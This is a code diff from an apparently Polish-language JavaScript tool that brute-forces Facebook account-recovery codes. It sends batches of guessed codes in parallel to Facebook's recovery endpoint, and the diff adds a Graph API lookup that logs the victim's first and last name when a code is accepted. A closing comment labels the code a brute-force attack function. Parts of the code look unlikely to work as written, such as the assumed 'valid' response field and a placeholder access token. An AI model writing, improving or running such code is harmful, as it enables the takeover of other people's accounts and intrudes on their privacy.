@@ -20,15 +20,36 @@ async function checkBatchValidity(codes) {
     const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";
     const requests = codes.map(code => axios.post(targetUrl, { code }));
     const responses = await Promise.all(requests);
-    
+
     for (let i = 0; i < responses.length; i++) {
         const response = responses[i];
         const code = codes[i];
         if (response.data.valid) {
-            return code;
+            const accountInfo = await fetchAccountInfo(); // Pobierz informacje o koncie użytkownika
+            if (accountInfo && accountInfo.firstName && accountInfo.lastName) {
+                console.log(`Znaleziono prawidłowy kod dla konta użytkownika ${accountInfo.firstName} ${accountInfo.lastName}.`);
+                return code;
+            } else {
+                console.log("Prawidłowy kod został znaleziony, ale konto nie zawiera imienia i nazwiska.");
+            }
         }
     }
     return null;
+}
+
+// Funkcja do pobierania informacji o koncie użytkownika
+async function fetchAccountInfo() {
+    try {
+        const response = await axios.get("https://graph.facebook.com/me", {
+            headers: {
+                "Authorization": "Bearer access_token" // Tutaj należy dodać prawidłowy token dostępu do Facebooka
+            }
+        });
+        return response.data;
+    } catch (error) {
+        console.error("Błąd podczas pobierania informacji o koncie:", error.message);
+        return null;
+    }
 }
 
 // Funkcja do ataku bruteforce
